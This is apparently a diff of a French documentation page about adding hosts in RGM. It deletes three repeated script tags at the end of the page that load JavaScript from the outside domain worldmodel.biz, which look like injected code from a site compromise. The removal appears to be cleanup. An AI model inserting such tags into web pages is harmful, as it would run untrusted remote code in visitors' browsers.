@@ -31,5 +31,3 @@ L'ajout des Hosts dans RGM peuvent être effectuée via différentes méthodes :
     </li>
   </ul>
 </li>       
-
-<script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script> <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script> <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
